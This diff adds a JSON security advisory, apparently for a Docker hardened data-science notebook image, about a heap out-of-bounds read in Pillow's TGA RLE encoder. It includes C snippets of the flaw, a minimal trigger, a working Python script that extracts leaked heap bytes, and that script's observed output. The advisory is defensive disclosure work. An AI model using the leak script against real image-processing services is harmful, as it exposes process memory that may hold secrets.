@@ -1,0 +1,107 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-5bkx-623n-3ski-xzeb",
+  "modified": "2026-09-21T12:48:35Z",
+  "published": "2026-09-21T12:48:35Z",
+  "upstream": [
+    "CVE-2026-59198"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\nPillow's TGA RLE encoder reads past its row buffer when saving a mode `\"1\"`\nimage. Adjacent process heap bytes can be copied into the generated TGA file.\n\nThe bug is reachable through the public save API:\n\n```python\nim.save(out, format=\"TGA\", compression=\"tga_rle\")\n```\n\nOlder affected Pillow versions use the equivalent public option `rle=True`.\n\nFor mode `\"1\"`, Pillow allocates a packed row buffer of `ceil(width / 8)`\nbytes, but `ImagingTgaRleEncode()` treats the row as one full byte per pixel.\n\nThe maximum valid TGA width is `65535`. At that width:\n\n```text\nallocated packed row buffer: 8192 bytes\nencoder byte-offset walk:     65535 bytes\nmaximum OOB window per row:   57343 bytes\n```\n\nOn non-ASAN Pillow `12.2.0`, the public-only maximum-width PoC below serialized\n`57297` bytes from distinct out-of-bounds source offsets into one returned TGA,\ncovering `99.92%` of the maximum adjacent heap window. No heap grooming, ctypes,\nprivate API, or malformed input file was used. The disclosure is emitted across\nmany TGA packet payload copies of at most `128` bytes each, not one large\n`memcpy()`.\n\n### Details\n\n`src/PIL/TgaImagePlugin.py` allows mode `\"1\"` TGA output and selects the\n`tga_rle` encoder when RLE compression is requested.\n\n`src/encode.c:_setimage()` allocates the row buffer using the packed-bit\nformula:\n\n```c\nstate->bytes = (state->bits * state->xsize + 7) / 8;\nstate->buffer = (UINT8 *)calloc(1, state->bytes);\n```\n\nFor mode `\"1\"`, `state->bits == 1`.\n\n`src/libImaging/TgaRleEncode.c` then computes:\n\n```c\nbytesPerPixel = (state->bits + 7) / 8;\n```\n\nThis becomes `1`, and the encoder uses pixel indexes as byte offsets:\n\n```c\nstatic int\ncomparePixels(const UINT8 *buf, int x, int bytesPerPixel) {\n    buf += x * bytesPerPixel;\n    return memcmp(buf, buf + bytesPerPixel, bytesPerPixel) == 0;\n}\n```\n\nThe packet payload `memcpy()` later copies those out-of-bounds source bytes into\nthe output. Raw packets copy up to `128` contiguous bytes, while RLE packets copy\none representative byte:\n\n```c\nmemcpy(\n    dst, state->buffer + (state->x * bytesPerPixel - state->count), flushCount\n);\n```\n\nA width-2 mode `\"1\"` image allocates one row byte and already triggers an ASAN\nheap-buffer-overflow read. Wider images increase the adjacent heap window and\nthe amount of heap data that can be serialized.\n\n### PoC\n\n#### Minimal ASAN trigger\n\n```python\nimport io\nfrom PIL import Image\n\nout = io.BytesIO()\nImage.new(\"1\", (2, 1)).save(out, format=\"TGA\", compression=\"tga_rle\")\n```\n\nObserved on local Pillow `12.3.0.dev0` ASAN target:\n\n```text\nERROR: AddressSanitizer: heap-buffer-overflow\nREAD of size 1\ncomparePixels /out/src/src/libImaging/TgaRleEncode.c:10\nImagingTgaRleEncode /out/src/src/libImaging/TgaRleEncode.c:81\n0 bytes after a 1-byte allocation from _setimage\n```\n\n#### Maximum-width heap disclosure\n\nThis PoC uses one maximum-width row. It parses the generated TGA packets and\nextracts only payload bytes whose source offsets were outside the allocated\npacked row. Rows are  avoided because they mostly repeat the same adjacent heap window.\n\nRun the following with a standard affected Pillow installation.\n\n```python\nimport hashlib\nimport io\nimport PIL\nfrom PIL import Image\n\nWIDTH = 65535\nATTEMPTS = 20\nROW_BYTES = (WIDTH + 7) // 8\nMAX_OOB_WINDOW = WIDTH - ROW_BYTES\n\ndef extract_oob_payload(data):\n    i = 18\n    pixel = 0\n    oob = bytearray()\n\n    while pixel < WIDTH:\n        descriptor = data[i]\n        i += 1\n        count = (descriptor & 0x7F) + 1\n\n        if descriptor & 0x80:\n            value = data[i]\n            i += 1\n            if pixel + count - 1 >= ROW_BYTES:\n                oob.append(value)\n        else:\n            values = data[i : i + count]\n            i += count\n            oob.extend(values[max(ROW_BYTES - pixel, 0) :])\n\n        pixel += count\n\n    return bytes(oob)\n\n\nbest = b\"\"\n\nfor _ in range(ATTEMPTS):\n    out = io.BytesIO()\n    Image.new(\"1\", (WIDTH, 1), 0).save(out, format=\"TGA\", compression=\"tga_rle\")\n    oob = extract_oob_payload(out.getvalue())\n    if len(oob) > len(best):\n        best = oob\n\nwith open(\"/tmp/max_oob_bytes.bin\", \"wb\") as fp:\n    fp.write(best)\n\nprint(f\"Pillow={PIL.__version__}\")\nprint(f\"packed_row_bytes={ROW_BYTES}\")\nprint(f\"maximum_oob_window={MAX_OOB_WINDOW}\")\nprint(f\"serialized_distinct_oob_offsets={len(best)}\")\nprint(f\"nonzero_oob_bytes={sum(byte != 0 for byte in best)}\")\nprint(f\"coverage={len(best) / MAX_OOB_WINDOW:.2%}\")\nprint(f\"sha256={hashlib.sha256(best).hexdigest()}\")\n```\n\nObserved on installed Pillow `12.2.0`:\n\n```text\nPillow=12.2.0\npacked_row_bytes=8192\nmaximum_oob_window=57343\nserialized_distinct_oob_offsets=57297\nnonzero_oob_bytes=54407\ncoverage=99.92%\n```\n\n### Impact\n\nThis is a heap out-of-bounds read and potential information disclosure.\n\nA maximum-width single-row image can cause nearly the full\n`57343`-byte adjacent heap window to be incorporated into one output file.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "datascience-notebook",
+        "purl": "pkg:docker/dhi/datascience-notebook?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "2026-05-11-debian13",
+        "2026-05-11-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-5bkx-623n-3ski-xzeb"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-fj7v-r99m-22gq"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59198"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-fj7v-r99m-22gq"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/python-pillow/Pillow/pull/9709"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/python-pillow/Pillow/commit/eada3cbd7fb9963ee90673fb7b5270124a0d5f4b"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/releases/tag/12.3.0"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://alas.aws.amazon.com/AL2023/ALAS-2026-2013.html"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-59205"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-59204"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-59200"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-59199"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-59198"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-59197"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54058"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-59198"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-59198"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-59198"
+    }
+  ]
+}
